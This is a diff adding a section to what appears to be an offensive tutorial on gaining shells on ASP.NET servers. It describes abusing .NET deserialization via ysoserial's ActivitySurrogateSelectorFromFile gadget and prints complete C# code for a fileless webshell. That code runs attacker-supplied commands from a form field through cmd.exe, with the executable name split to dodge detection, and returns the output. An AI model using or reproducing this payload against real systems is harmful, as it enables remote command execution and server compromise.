@@ -58,5 +58,37 @@ Then upload folder bin to webserver, we can finally execute our webshell
 To sum up, you have to has to combine path traversal with arbitrary file upload, that makes it harder to get shell.
 
 ## Deserialize
+In case of deserialize, each time we want to execute different command, we have to re-generate payload using ysoserial, then url encode, send request, etc, ... For better use, sometimes people manipulate deserialization to create web shell, but it leads to problem I already said in the overview above. But we really can get shell without creating files on the server with gadget ActivitySurrogateSelectorFromFile already included in ysoserial. This gadget will create an assembly with our custom C# code, then when deserialize, make the server load that assembly.
+
+First create shell.cs
+
+```csharp
+// ExploitClass.cs
+class E{
+    public E()
+    {
+		//System.Web.HttpContext.Current.Response.StatusCode = System.Convert.ToInt32(System.Web.HttpContext.Current.Request.Cookies["c"].Value);
+        System.Web.HttpContext context = System.Web.HttpContext.Current;
+        context.Server.ClearError();
+        context.Response.Clear();
+        try
+        {
+			string dir = context.Server.MapPath("~/") + "/";
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            process.StartInfo.FileName = "cm"+"d.exe";
+            string cmd = context.Request.Form["c"];
+            process.StartInfo.Arguments = "/c " + cmd;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.RedirectStandardError = true;
+            process.StartInfo.WorkingDirectory = dir;
+            process.StartInfo.UseShellExecute = false;
+            process.Start();
+            string output = process.StandardOutput.ReadToEnd();
+            context.Response.Write(output);
+        } catch (System.Exception) {}
+        context.Response.Flush();
+        context.Response.End();
+    }}
+```
 
 
